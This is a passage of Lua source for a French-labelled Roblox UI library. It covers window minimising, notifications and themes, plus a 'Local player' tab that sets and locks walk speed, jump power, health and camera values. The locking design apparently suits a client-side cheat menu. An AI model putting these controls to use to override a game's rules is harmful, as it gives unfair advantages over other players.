        minimize.Text = "−"
        minimize.Rotation = 0
        minimize.TextTransparency = 0
        close.Visible = true
        close.Position = UDim2.new(1, -40, 0, 9)
        close.Size = UDim2.fromOffset(28, 28)
        avatar.Visible = false
        return
    end

    local style = window.MinimizeStyle or "Barre"
    if style == "Barre" then
        top.Size = UDim2.new(1, 0, 0, 48)
        title.Visible = true
        title.Position = UDim2.new(0, 16, 0, 0)
        title.Size = UDim2.new(1, -160, 1, 0)
        reload.Visible = true
        reload.Position = UDim2.new(1, -108, 0, 9)
        reload.Size = UDim2.fromOffset(28, 28)
        minimize.Visible = true
        minimize.Position = UDim2.new(1, -74, 0, 9)
        minimize.Size = UDim2.fromOffset(28, 28)
        close.Visible = true
        close.Position = UDim2.new(1, -40, 0, 9)
        close.Size = UDim2.fromOffset(28, 28)
        avatar.Visible = false
    elseif style == "Carré" then
        top.Size = UDim2.fromScale(1, 1)
        title.Visible = false
        reload.Visible = false
        close.Visible = false
        minimize.Visible = true
        minimize.Position = UDim2.new(0.5, -20, 0.5, -20)
        minimize.Size = UDim2.fromOffset(40, 40)
        minimize.Text = "+"
        minimize.Rotation = 0
        minimize.TextTransparency = 0
        avatar.Visible = false
    elseif style == "Avatar" then
        top.Size = UDim2.fromScale(1, 1)
        title.Visible = false
        reload.Visible = false
        minimize.Visible = false
        close.Visible = false
        avatar.Visible = true
        avatar.Position = UDim2.new(0.5, -23, 0.5, -23)
        avatar.Size = UDim2.fromOffset(46, 46)
    end
end

function WindowMethods:SetMinimizeStyle(style)
    if style ~= "Barre" and style ~= "Carré" and style ~= "Avatar" then
        return false
    end
    self.MinimizeStyle = style
    if self.Minimized then
        applyMinimizeAppearance(self, true)
        if self.MinimizeButton then
            self.MinimizeButton.Text = "+"
            self.MinimizeButton.Rotation = 0
            self.MinimizeButton.TextTransparency = 0
        end
        local width, height = getMinimizedDimensions(self)
        TweenService:Create(self.Main, TweenInfo.new(0.18, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
            Size = UDim2.fromOffset(width, height),
            Position = getMinimizedPosition(self, self.NormalPosition),
        }):Play()
    end
    return true
end

function WindowMethods:SetMinimizePosition(mode)
    local valid = {
        ["Coin supérieur gauche"] = true,
        ["Centre de la fenêtre"] = true,
        ["Coin inférieur droit"] = true,
    }
    if not valid[mode] then return false end
    self.MinimizePositionMode = mode
    if self.Minimized and self.Main then
        local width, height = getMinimizedDimensions(self)
        TweenService:Create(self.Main, TweenInfo.new(0.18, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
            Size = UDim2.fromOffset(width, height),
            Position = getMinimizedPosition(self, self.NormalPosition),
        }):Play()
    end
    return true
end

function WindowMethods:ToggleMinimize()
    if self.Destroyed or not self.Main then return end
    if self.Minimized then
        self:Restore()
        return
    end

    self.NormalPosition = self.Main.Position
    self.Minimized = true
    self.TabList.Visible = false
    self.Sidebar.Visible = false
    self.ContentHolder.Visible = false
    applyMinimizeAppearance(self, true)
    if self.MinimizeStyle ~= "Avatar" then animateMinimizeIcon(self, true) end
    local width, height = getMinimizedDimensions(self)
    TweenService:Create(self.Main, TweenInfo.new(0.22, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
        Size = UDim2.fromOffset(width, height),
        Position = getMinimizedPosition(self, self.NormalPosition),
    }):Play()
end

function WindowMethods:Minimize()
    if not self.Minimized then self:ToggleMinimize() end
end

function WindowMethods:Restore()
    if self.Destroyed or not self.Main then return end
    if self.Minimized then
        self.NormalPosition = self.NormalPosition or getNormalPositionFromMinimized(self, self.Main.Position)
    end
    self.Minimized = false
    self.TabList.Visible = true
    self.Sidebar.Visible = true
    self.ContentHolder.Visible = true
    applyMinimizeAppearance(self, false)
    animateMinimizeIcon(self, false)
    local scale = self.ScaleFactor or 1
    TweenService:Create(self.Main, TweenInfo.new(0.22, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
        Size = UDim2.fromOffset(680, 410),
        Position = self.NormalPosition or UDim2.new(0.5, -340 * scale, 0.5, -205 * scale),
    }):Play()
end

-- Rafraîchit visuellement le menu sans détruire les tabs/contrôles du script hôte.
-- Cela conserve les valeurs actuelles; ce n'est pas une ré-exécution du script externe.
function WindowMethods:Reload()
    if self.Destroyed or self.Reloading or not (self.Main and self.Main.Parent) then return false end
    self.Reloading = true
    for _, popup in ipairs(self.Dropdowns or {}) do
        if popup and popup.Parent then popup.Visible = false end
    end
    if self.ColorpickerPopups then
        for _, popup in ipairs(self.ColorpickerPopups) do
            if popup and popup.Parent then popup.Visible = false end
        end
    end

    local overlay = new("Frame", {
        Name = "RefreshOverlay",
        BackgroundColor3 = Library.Theme.Main,
        BackgroundTransparency = 0.12,
        BorderSizePixel = 0,
        Size = UDim2.fromScale(1, 1),
        ClipsDescendants = true,
        ZIndex = 5000,
        Parent = self.Main,
    })
    addCorner(overlay, 11)
    local label = new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 20, 0.5, -15),
        Size = UDim2.new(1, -40, 0, 24),
        Text = "Actualisation de l'interface…",
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.GothamBold,
        TextSize = 14,
        TextTruncate = Enum.TextTruncate.AtEnd,
        TextXAlignment = Enum.TextXAlignment.Center,
        ZIndex = 5001,
        Parent = overlay,
    })
    local track = new("Frame", {
        BackgroundColor3 = Library.Theme.Divider,
        BorderSizePixel = 0,
        Position = UDim2.new(0.25, 0, 0.5, 16),
        Size = UDim2.new(0.5, 0, 0, 4),
        ZIndex = 5001,
        Parent = overlay,
    })
    addCorner(track, 2)
    local fill = new("Frame", {
        BackgroundColor3 = Library.Theme.Accent,
        BorderSizePixel = 0,
        Size = UDim2.new(0, 0, 1, 0),
        ZIndex = 5002,
        Parent = track,
    })
    addCorner(fill, 2)
    TweenService:Create(fill, TweenInfo.new(0.65, Enum.EasingStyle.Linear), {Size = UDim2.new(1, 0, 1, 0)}):Play()
    task.delay(0.70, function()
        if overlay and overlay.Parent then
            TweenService:Create(overlay, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
                BackgroundTransparency = 1,
            }):Play()
            TweenService:Create(label, TweenInfo.new(0.18), {TextTransparency = 1}):Play()
            TweenService:Create(track, TweenInfo.new(0.18), {BackgroundTransparency = 1}):Play()
            TweenService:Create(fill, TweenInfo.new(0.18), {BackgroundTransparency = 1}):Play()
            task.delay(0.20, function()
                if overlay and overlay.Parent then overlay:Destroy() end
                self.Reloading = false
                applyBlur()
            end)
        else
            self.Reloading = false
        end
    end)
    return true
end

function WindowMethods:Destroy()
    if self.Destroyed then
        return
    end

    self.Destroyed = true
    if not Library:IsRunning() then
        Library:SetTelemetryEnabled(false)
    end

    local gui = self.Gui
    local main = self.Main

    if main and main.Parent then
        TweenService:Create(
            main,
            TweenInfo.new(Library.Settings.FadeTime, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
            {BackgroundTransparency = 1}
        ):Play()
    end

    task.delay(Library.Settings.FadeTime + 0.03, function()
        if gui then
            pcall(function()
                gui:Destroy()
            end)
        end

        applyBlur()
    end)
end

function Library:MakeNotification(config)
    config = config or {}
    local window
    for index = #self.Windows, 1, -1 do
        local candidate = self.Windows[index]
        if candidate and not candidate.Destroyed and candidate.Gui and candidate.Gui.Parent then
            window = candidate
            break
        end
    end
    if not window then return nil end

    local holder = window.Gui:FindFirstChild("Notifications")
    if not holder then
        holder = new("Frame", {
            Name = "Notifications",
            BackgroundTransparency = 1,
            AnchorPoint = Vector2.new(1, 1),
            Position = UDim2.new(1, -12, 1, -12),
            Size = UDim2.new(0, math.max(150, math.min(330, (Workspace.CurrentCamera and Workspace.CurrentCamera.ViewportSize.X or 360) - 24)), 0, math.min(360, (Workspace.CurrentCamera and Workspace.CurrentCamera.ViewportSize.Y or 640) * 0.55)),
            Parent = window.Gui,
            ZIndex = 2000,
        })
        new("UIListLayout", {
            Padding = UDim.new(0, 7),
            VerticalAlignment = Enum.VerticalAlignment.Bottom,
            SortOrder = Enum.SortOrder.LayoutOrder,
            Parent = holder,
        })
    end

    local isDynamic = config.Type == "Dynamic" or config.Dynamic == true
    local duration = tonumber(config.Time) or 3
    local accent = typeof(config.Color) == "Color3" and config.Color or Library.Theme.Accent
    local baseBackgroundTransparency = 0.05

    local frame = new("Frame", {
        Name = "Notification",
        BackgroundColor3 = Library.Theme.Second,
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        Size = UDim2.new(1, 0, 0, 0),
        AutomaticSize = Enum.AutomaticSize.Y,
        Parent = holder,
        ZIndex = 2001,
    })
    addCorner(frame, 8)
    local stroke = addStroke(frame, accent, 1, 1)
    new("UIPadding", {
        PaddingTop = UDim.new(0, 8),
        PaddingBottom = UDim.new(0, 8),
        PaddingLeft = UDim.new(0, 12),
        PaddingRight = UDim.new(0, 12),
        Parent = frame,
    })

    local contentHolder = new("Frame", {
        BackgroundTransparency = 1,
        Size = UDim2.new(1, 0, 0, 0),
        AutomaticSize = Enum.AutomaticSize.Y,
        Parent = frame,
        ZIndex = 2002,
    })
    new("UIListLayout", {
        Padding = UDim.new(0, 4),
        SortOrder = Enum.SortOrder.LayoutOrder,
        Parent = contentHolder,
    })

    local title = new("TextLabel", {
        BackgroundTransparency = 1,
        Size = UDim2.new(1, 0, 0, 18),
        Text = tostring(config.Name or "Notification"),
        TextColor3 = Library.Theme.Text,
        TextTransparency = 1,
        Font = Enum.Font.GothamBold,
        TextSize = 13,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextTruncate = Enum.TextTruncate.AtEnd,
        Parent = contentHolder,
        ZIndex = 2003,
    })
    local content = new("TextLabel", {
        BackgroundTransparency = 1,
        Size = UDim2.new(1, 0, 0, 0),
        AutomaticSize = Enum.AutomaticSize.Y,
        Text = tostring(config.Content or ""),
        TextColor3 = Library.Theme.TextDark,
        TextTransparency = 1,
        Font = Enum.Font.Gotham,
        TextSize = 11,
        TextWrapped = true,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextYAlignment = Enum.TextYAlignment.Top,
        Parent = contentHolder,
        ZIndex = 2003,
    })

    local destroyed = false
    local timerToken = 0
    local timerRunning = false
    local api = {
        Frame = frame,
        Title = title,
        Content = content,
        Type = isDynamic and "Dynamic" or "Classic",
    }

    local function fadeOut()
        if destroyed or not frame.Parent then return end
        destroyed = true
        timerToken += 1
        local tweenInfo = TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
        pcall(function()
            TweenService:Create(frame, tweenInfo, {BackgroundTransparency = 1}):Play()
            TweenService:Create(stroke, tweenInfo, {Transparency = 1}):Play()
            for _, descendant in ipairs(frame:GetDescendants()) do
                if descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("TextBox") then
                    TweenService:Create(descendant, tweenInfo, {TextTransparency = 1, BackgroundTransparency = 1}):Play()
                elseif descendant:IsA("ImageLabel") or descendant:IsA("ImageButton") then
                    TweenService:Create(descendant, tweenInfo, {ImageTransparency = 1, BackgroundTransparency = 1}):Play()
                elseif descendant:IsA("UIStroke") then
                    TweenService:Create(descendant, tweenInfo, {Transparency = 1}):Play()
                end
            end
        end)
        task.delay(0.24, function()
            if frame and frame.Parent then frame:Destroy() end
        end)
    end

    local function resetTimer()
        timerToken += 1
        if duration <= 0 or timerRunning then return end
        timerRunning = true
        task.spawn(function()
            while not destroyed and frame and frame.Parent do
                local currentToken = timerToken
                if duration <= 0 then break end
                local deadline = os.clock() + duration
                while not destroyed and frame and frame.Parent
                    and currentToken == timerToken and os.clock() < deadline do
                    task.wait(0.1)
                end
                if destroyed or not frame or not frame.Parent then break end
                if currentToken == timerToken then
                    fadeOut()
                    break
                end
                if duration <= 0 then break end
            end
            timerRunning = false
        end)
    end

    function api:SetContent(text)
        if destroyed then return end
        content.Text = tostring(text or "")
        -- Pour une notification dynamique, le délai repart après la dernière mise à jour.
        if isDynamic then resetTimer() end
    end
    function api:SetName(text)
        if destroyed then return end
        title.Text = tostring(text or "Notification")
        if isDynamic then resetTimer() end
    end
    function api:Update(update)
        if destroyed or type(update) ~= "table" then return end
        if update.Name ~= nil then title.Text = tostring(update.Name) end
        if update.Content ~= nil then content.Text = tostring(update.Content) end
        if update.Time ~= nil then duration = tonumber(update.Time) or duration end
        if update.Color and typeof(update.Color) == "Color3" then
            stroke.Color = update.Color
        end
        if isDynamic then resetTimer() end
    end
    function api:Destroy()
        fadeOut()
    end

    -- Entrée : fond, bordure et texte apparaissent ensemble.
    TweenService:Create(frame, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        BackgroundTransparency = baseBackgroundTransparency,
    }):Play()
    TweenService:Create(stroke, TweenInfo.new(0.18), {Transparency = 0.15}):Play()
    TweenService:Create(title, TweenInfo.new(0.18), {TextTransparency = 0}):Play()
    TweenService:Create(content, TweenInfo.new(0.18), {TextTransparency = 0}):Play()
    resetTimer()
    return api
end

function Library:MakeDynamicNotification(config)
    config = type(config) == "table" and table.clone(config) or {}
    config.Type = "Dynamic"
    return self:MakeNotification(config)
end

function Library:SetBlur(enabled, size)
    self.Settings.BlurEnabled = enabled == true
    if size ~= nil then
        self.Settings.BlurSize = math.clamp(tonumber(size) or 8, 0, 24)
    end
    applyBlur()
end

function Library:SetBackgroundTransparency(value)
    self.Settings.BackgroundTransparency = math.clamp(
        tonumber(value) or 0.50,
        0,
        0.92
    )

    for _, window in ipairs(self.Windows) do
        if window.Main and window.Main.Parent then
            window.Main.BackgroundTransparency = self.Settings.BackgroundTransparency
        end
        if window.Top and window.Top.Parent then
            window.Top.BackgroundTransparency = self.Settings.BackgroundTransparency
        end
        if window.Sidebar and window.Sidebar.Parent then
            window.Sidebar.BackgroundTransparency = self.Settings.BackgroundTransparency
        end
        if window.PlayerCard and window.PlayerCard.Parent then
            window.PlayerCard.BackgroundTransparency = self.Settings.BackgroundTransparency
        end
    end
end

function Library:SetFadeTime(value)
    self.Settings.FadeTime = math.clamp(
        tonumber(value) or 0.20,
        0.05,
        1
    )
end

function Library:SetTheme(theme)
    if type(theme) ~= "table" then
        return
    end

    for key, value in pairs(theme) do
        if self.Theme[key] ~= nil then
            self.Theme[key] = value
        end
    end
end


function Library:ApplyUIProfile(name)
    local profile = self.UIProfiles[name]
    if type(profile) ~= "table" then
        return false
    end

    self.CurrentUIProfile = name

    self.Theme.Main = profile.Main
    self.Theme.Second = profile.Second
    self.Theme.Accent = profile.Accent

    self.Settings.BackgroundTransparency =
        math.clamp(tonumber(profile.BackgroundTransparency) or 0.50, 0, 0.90)

    local blurPercent =
        math.clamp(tonumber(profile.BlurPercent) or 0, 0, 100)

    self.Settings.BlurEnabled = blurPercent > 0
    self.Settings.BlurSize = 24 * (blurPercent / 100)

    for _, window in ipairs(self.Windows) do
        if window.Main then
            window.Main.BackgroundColor3 = self.Theme.Main
            window.Main.BackgroundTransparency =
                self.Settings.BackgroundTransparency
        end

        if window.Top then
            window.Top.BackgroundColor3 = self.Theme.Second
        end

        if window.Sidebar then
            window.Sidebar.BackgroundColor3 = self.Theme.Second
        end
        for _, patch in ipairs(window.SidebarCornerPatches or {}) do
            if patch and patch.Parent then patch.BackgroundColor3 = self.Theme.Second end
        end
    end

    applyBlur()
    return true
end

function Library:BuildLocalPlayerTab(window)
    local tab = window:MakeTab({Name = "Local player"})

    local function getHumanoid()
        local character = LocalPlayer and LocalPlayer.Character
        return character and character:FindFirstChildOfClass("Humanoid") or nil
    end

    local humanoid = getHumanoid()
    local jumpProperty = humanoid and humanoid.UseJumpPower and "JumpPower" or "JumpHeight"
    local desiredSpeed = humanoid and humanoid.WalkSpeed or 16
    local desiredJump = humanoid and humanoid[jumpProperty] or (jumpProperty == "JumpPower" and 50 or 7.2)
    local desiredHipHeight = humanoid and humanoid.HipHeight or 2
    local desiredMaxHealth = humanoid and humanoid.MaxHealth or 100
    local desiredHealth = humanoid and humanoid.Health or 100
    local desiredAutoRotate = humanoid and humanoid.AutoRotate
    if desiredAutoRotate == nil then desiredAutoRotate = true end
    local desiredPlatformStand = humanoid and humanoid.PlatformStand == true or false
    local desiredJumpingEnabled = true
    if humanoid then
        pcall(function() desiredJumpingEnabled = humanoid:GetStateEnabled(Enum.HumanoidStateType.Jumping) end)
    end
    local desiredFOV = Workspace.CurrentCamera and Workspace.CurrentCamera.FieldOfView or 70
    local desiredMinZoom = LocalPlayer and LocalPlayer.CameraMinZoomDistance or 0.5
    local desiredMaxZoom = LocalPlayer and LocalPlayer.CameraMaxZoomDistance or 12.5
    local desiredCameraMode = LocalPlayer and LocalPlayer.CameraMode or Enum.CameraMode.Classic

    local speedLocked, jumpLocked, hipHeightLocked = false, false, false
    local maxHealthLocked, healthLocked = false, false
    local autoRotateLocked, platformStandLocked = false, false
    local fovLocked, zoomLocked, cameraModeLocked = false, false, false
    local speedSlider, jumpSlider, hipHeightSlider, maxHealthSlider, healthSlider
    local fovSlider, minZoomSlider, maxZoomSlider
    local boundHumanoidConnections = {}
    local cameraFOVConnection

    local function clearHumanoidConnections()
        for _, connection in ipairs(boundHumanoidConnections) do
            pcall(function() connection:Disconnect() end)
        end
        table.clear(boundHumanoidConnections)
    end

    local function updateSlider(slider, value)
        if slider then slider:Set(value, true) end
    end

    local function bindHumanoid(nextHumanoid)
        clearHumanoidConnections()
        humanoid = nextHumanoid
        if not humanoid then return end
        jumpProperty = humanoid.UseJumpPower and "JumpPower" or "JumpHeight"

        if not speedLocked then desiredSpeed = humanoid.WalkSpeed else humanoid.WalkSpeed = desiredSpeed end
        if not jumpLocked then desiredJump = humanoid[jumpProperty] else humanoid[jumpProperty] = desiredJump end
        if not hipHeightLocked then desiredHipHeight = humanoid.HipHeight else humanoid.HipHeight = desiredHipHeight end
        if not maxHealthLocked then desiredMaxHealth = humanoid.MaxHealth else humanoid.MaxHealth = desiredMaxHealth end
        if not healthLocked then desiredHealth = humanoid.Health else humanoid.Health = math.min(desiredHealth, humanoid.MaxHealth) end
        if not autoRotateLocked then desiredAutoRotate = humanoid.AutoRotate else humanoid.AutoRotate = desiredAutoRotate end
        if not platformStandLocked then desiredPlatformStand = humanoid.PlatformStand else humanoid.PlatformStand = desiredPlatformStand end

        updateSlider(speedSlider, desiredSpeed)
        updateSlider(jumpSlider, desiredJump)
        updateSlider(hipHeightSlider, desiredHipHeight)
        updateSlider(maxHealthSlider, desiredMaxHealth)
        updateSlider(healthSlider, desiredHealth)

        table.insert(boundHumanoidConnections, humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
            if not speedLocked and humanoid then desiredSpeed = humanoid.WalkSpeed; updateSlider(speedSlider, desiredSpeed) end
        end))
        table.insert(boundHumanoidConnections, humanoid:GetPropertyChangedSignal(jumpProperty):Connect(function()
            if not jumpLocked and humanoid then desiredJump = humanoid[jumpProperty]; updateSlider(jumpSlider, desiredJump) end
        end))
        table.insert(boundHumanoidConnections, humanoid:GetPropertyChangedSignal("HipHeight"):Connect(function()
            if not hipHeightLocked and humanoid then desiredHipHeight = humanoid.HipHeight; updateSlider(hipHeightSlider, desiredHipHeight) end
        end))
        table.insert(boundHumanoidConnections, humanoid:GetPropertyChangedSignal("MaxHealth"):Connect(function()
            if not maxHealthLocked and humanoid then desiredMaxHealth = humanoid.MaxHealth; updateSlider(maxHealthSlider, desiredMaxHealth) end
        end))
        table.insert(boundHumanoidConnections, humanoid:GetPropertyChangedSignal("Health"):Connect(function()
            if not healthLocked and humanoid then desiredHealth = humanoid.Health; updateSlider(healthSlider, desiredHealth) end
        end))
        table.insert(boundHumanoidConnections, humanoid:GetPropertyChangedSignal("AutoRotate"):Connect(function()
            if not autoRotateLocked and humanoid then desiredAutoRotate = humanoid.AutoRotate; if Library.Flags["LocalPlayer.AutoRotate"] then Library.Flags["LocalPlayer.AutoRotate"]:Set(desiredAutoRotate) end end
        end))
        table.insert(boundHumanoidConnections, humanoid:GetPropertyChangedSignal("PlatformStand"):Connect(function()
            if not platformStandLocked and humanoid then desiredPlatformStand = humanoid.PlatformStand; if Library.Flags["LocalPlayer.PlatformStand"] then Library.Flags["LocalPlayer.PlatformStand"]:Set(desiredPlatformStand) end end
        end))
    end

    tab:AddSection({Name = "Déplacements"})
    speedSlider = tab:AddSlider({
        Name = "Vitesse (WalkSpeed)", Min = 0, Max = 200, Default = desiredSpeed, Increment = 0.01,
        FireOnInit = false, Flag = "LocalPlayer.WalkSpeed",
        Callback = function(value)
            desiredSpeed = value
            local currentHumanoid = getHumanoid()
            if currentHumanoid then pcall(function() currentHumanoid.WalkSpeed = value end) end
        end,
    })
    tab:AddToggle({
        Name = "Verrouiller la vitesse", Default = false, Flag = "LocalPlayer.LockWalkSpeed",
        Callback = function(value)
            speedLocked = value == true
            if speedLocked and speedSlider then desiredSpeed = speedSlider.Value end
        end,
    })

    jumpSlider = tab:AddSlider({
        Name = "Valeur de saut (JumpPower / JumpHeight)", Min = 0, Max = 200, Default = desiredJump, Increment = 0.01,
        FireOnInit = false, Flag = "LocalPlayer.JumpForce",
        Callback = function(value)
            desiredJump = value
            local currentHumanoid = getHumanoid()
            if currentHumanoid then
                jumpProperty = currentHumanoid.UseJumpPower and "JumpPower" or "JumpHeight"
                pcall(function() currentHumanoid[jumpProperty] = value end)
            end
        end,
    })
    tab:AddToggle({
        Name = "Verrouiller la valeur de saut", Default = false, Flag = "LocalPlayer.LockJumpForce",
        Callback = function(value)
            jumpLocked = value == true
            if jumpLocked and jumpSlider then desiredJump = jumpSlider.Value end
        end,
    })
    tab:AddToggle({
        Name = "Utiliser JumpPower", Default = humanoid and humanoid.UseJumpPower == true or false,
        Flag = "LocalPlayer.UseJumpPower",
        Callback = function(value)
            local currentHumanoid = getHumanoid()
            if currentHumanoid then
                pcall(function() currentHumanoid.UseJumpPower = value == true end)
                bindHumanoid(currentHumanoid)
            end
        end,
    })

    hipHeightSlider = tab:AddSlider({
        Name = "Hauteur des hanches (HipHeight)", Min = -10, Max = 200, Default = desiredHipHeight, Increment = 0.1,
        FireOnInit = false, Flag = "LocalPlayer.HipHeight",
        Callback = function(value)
            desiredHipHeight = value
            local currentHumanoid = getHumanoid()
            if currentHumanoid then pcall(function() currentHumanoid.HipHeight = value end) end
        end,
    })
    tab:AddToggle({
        Name = "Verrouiller HipHeight", Default = false, Flag = "LocalPlayer.LockHipHeight",
        Callback = function(value) hipHeightLocked = value == true; if hipHeightLocked and hipHeightSlider then desiredHipHeight = hipHeightSlider.Value end end,
    })

    tab:AddSection({Name = "Santé"})
    maxHealthSlider = tab:AddSlider({
        Name = "Santé maximale (MaxHealth)", Min = 1, Max = 1000, Default = desiredMaxHealth, Increment = 1,
        FireOnInit = false, Flag = "LocalPlayer.MaxHealth",
        Callback = function(value)
            desiredMaxHealth = value
            local currentHumanoid = getHumanoid()
            if currentHumanoid then pcall(function() currentHumanoid.MaxHealth = value end) end
        end,
    })
    tab:AddToggle({
        Name = "Verrouiller MaxHealth", Default = false, Flag = "LocalPlayer.LockMaxHealth",
        Callback = function(value) maxHealthLocked = value == true; if maxHealthLocked and maxHealthSlider then desiredMaxHealth = maxHealthSlider.Value end end,
    })
    healthSlider = tab:AddSlider({
        Name = "Santé actuelle (Health)", Min = 0, Max = 1000, Default = desiredHealth, Increment = 1,
        FireOnInit = false, Flag = "LocalPlayer.Health",
        Callback = function(value)
            desiredHealth = value
            local currentHumanoid = getHumanoid()
            if currentHumanoid then pcall(function() currentHumanoid.Health = math.min(value, currentHumanoid.MaxHealth) end) end
        end,
    })
    tab:AddToggle({
        Name = "Verrouiller la santé", Default = false, Flag = "LocalPlayer.LockHealth",
        Callback = function(value)
            healthLocked = value == true
            if healthLocked and healthSlider then desiredHealth = healthSlider.Value end
        end,
    })

    tab:AddSection({Name = "Comportement"})
    tab:AddToggle({
        Name = "Rotation automatique (AutoRotate)", Default = desiredAutoRotate,
        Flag = "LocalPlayer.AutoRotate",
        Callback = function(value)
            desiredAutoRotate = value == true
            local currentHumanoid = getHumanoid()
            if currentHumanoid then pcall(function() currentHumanoid.AutoRotate = desiredAutoRotate end) end
        end,
    })
    tab:AddToggle({
        Name = "Verrouiller AutoRotate", Default = false, Flag = "LocalPlayer.LockAutoRotate",
        Callback = function(value) autoRotateLocked = value == true; if autoRotateLocked and getHumanoid() then desiredAutoRotate = getHumanoid().AutoRotate end end,
    })
    tab:AddToggle({
        Name = "PlatformStand", Default = desiredPlatformStand,
        Flag = "LocalPlayer.PlatformStand",
        Callback = function(value)
            desiredPlatformStand = value == true
            local currentHumanoid = getHumanoid()
            if currentHumanoid then pcall(function() currentHumanoid.PlatformStand = desiredPlatformStand end) end
        end,
    })
    tab:AddToggle({
        Name = "Verrouiller PlatformStand", Default = false, Flag = "LocalPlayer.LockPlatformStand",
        Callback = function(value) platformStandLocked = value == true; if platformStandLocked and getHumanoid() then desiredPlatformStand = getHumanoid().PlatformStand end end,
    })
    tab:AddButton({
        Name = "S'asseoir / se lever",
        Callback = function()
            local currentHumanoid = getHumanoid()
            if currentHumanoid then pcall(function() currentHumanoid.Sit = not currentHumanoid.Sit end) end
        end,
    })
    tab:AddToggle({
        Name = "Autoriser le saut", Default = desiredJumpingEnabled,
        Flag = "LocalPlayer.JumpingEnabled",
        Callback = function(value)
            local currentHumanoid = getHumanoid()
            if currentHumanoid then pcall(function() currentHumanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, value == true) end) end
        end,
    })

    tab:AddSection({Name = "Caméra"})
    local fovLockToggle
    fovSlider = tab:AddSlider({
        Name = "Champ de vision (FOV)", Min = 1, Max = 120, Default = desiredFOV, Increment = 0.1,
        FireOnInit = false, Flag = "LocalPlayer.FOV",
        Callback = function(value)
            desiredFOV = value
            local camera = Workspace.CurrentCamera
            if camera then pcall(function() camera.FieldOfView = value end) end
        end,
    })
    fovLockToggle = tab:AddToggle({
        Name = "Verrouiller le FOV", Default = false, Flag = "LocalPlayer.LockFOV",
        Callback = function(value) fovLocked = value == true; if fovLocked and fovSlider then desiredFOV = fovSlider.Value end end,
    })
    minZoomSlider = tab:AddSlider({
        Name = "Zoom minimum", Min = 0.5, Max = 128, Default = desiredMinZoom, Increment = 0.1,
        FireOnInit = false, Flag = "LocalPlayer.CameraMinZoom",
        Callback = function(value)
            desiredMinZoom = value
            if desiredMinZoom > desiredMaxZoom then desiredMaxZoom = desiredMinZoom; updateSlider(maxZoomSlider, desiredMaxZoom) end
            pcall(function() LocalPlayer.CameraMinZoomDistance = desiredMinZoom end)
        end,
    })
    maxZoomSlider = tab:AddSlider({
        Name = "Zoom maximum", Min = 0.5, Max = 128, Default = desiredMaxZoom, Increment = 0.1,
        FireOnInit = false, Flag = "LocalPlayer.CameraMaxZoom",
        Callback = function(value)
            desiredMaxZoom = value
            if desiredMaxZoom < desiredMinZoom then desiredMinZoom = desiredMaxZoom; updateSlider(minZoomSlider, desiredMinZoom) end
            pcall(function() LocalPlayer.CameraMaxZoomDistance = desiredMaxZoom end)
        end,
    })
    tab:AddToggle({
        Name = "Verrouiller le zoom", Default = false, Flag = "LocalPlayer.LockZoom",
        Callback = function(value)
            zoomLocked = value == true
            if zoomLocked then
                desiredMinZoom = minZoomSlider.Value
                desiredMaxZoom = maxZoomSlider.Value
            end
        end,
    })
    tab:AddDropdown({
        Name = "Mode caméra", Default = desiredCameraMode.Name,
        Options = {"Classic", "LockFirstPerson"}, Flag = "LocalPlayer.CameraMode",
        Callback = function(value)
            local mode = Enum.CameraMode[value]
            if mode then desiredCameraMode = mode; pcall(function() LocalPlayer.CameraMode = mode end) end
        end,
    })
    tab:AddToggle({
        Name = "Verrouiller le mode caméra", Default = false, Flag = "LocalPlayer.LockCameraMode",
        Callback = function(value) cameraModeLocked = value == true; if cameraModeLocked then desiredCameraMode = LocalPlayer.CameraMode end end,
    })

    tab:AddSection({Name = "Personnage"})
    tab:AddButton({
        Name = "Réinitialiser le personnage",
        Callback = function()
            local currentHumanoid = getHumanoid()
            if currentHumanoid then
                pcall(function() currentHumanoid.Health = 0 end)
            else
                Library:MakeNotification({Name = "Local player", Content = "Personnage introuvable.", Time = 3})
            end
        end,
    })

    connect(LocalPlayer.CharacterAdded, function(character)
        task.spawn(function()
            local nextHumanoid = character:WaitForChild("Humanoid", 10)
            if nextHumanoid and nextHumanoid:IsA("Humanoid") then bindHumanoid(nextHumanoid) end
        end)
    end)
    bindHumanoid(humanoid)

    local function bindCamera(camera)
        if cameraFOVConnection then
            pcall(function() cameraFOVConnection:Disconnect() end)
            cameraFOVConnection = nil
        end
        if not camera then return end
        if not fovLocked then
            desiredFOV = camera.FieldOfView
            updateSlider(fovSlider, desiredFOV)
        else
            pcall(function() camera.FieldOfView = desiredFOV end)
        end
        cameraFOVConnection = camera:GetPropertyChangedSignal("FieldOfView"):Connect(function()
            if not fovLocked and Workspace.CurrentCamera == camera then
                desiredFOV = camera.FieldOfView
                updateSlider(fovSlider, desiredFOV)
            end
        end)
        table.insert(Library.Connections, cameraFOVConnection)
    end
    if Workspace.CurrentCamera then bindCamera(Workspace.CurrentCamera) end
    connect(Workspace:GetPropertyChangedSignal("CurrentCamera"), function() bindCamera(Workspace.CurrentCamera) end)

    connect(LocalPlayer:GetPropertyChangedSignal("CameraMinZoomDistance"), function()
        if not zoomLocked then desiredMinZoom = LocalPlayer.CameraMinZoomDistance; updateSlider(minZoomSlider, desiredMinZoom) end
    end)
    connect(LocalPlayer:GetPropertyChangedSignal("CameraMaxZoomDistance"), function()
        if not zoomLocked then desiredMaxZoom = LocalPlayer.CameraMaxZoomDistance; updateSlider(maxZoomSlider, desiredMaxZoom) end
    end)
    connect(LocalPlayer:GetPropertyChangedSignal("CameraMode"), function()
        if not cameraModeLocked then
            desiredCameraMode = LocalPlayer.CameraMode
            local control = Library.Flags["LocalPlayer.CameraMode"]
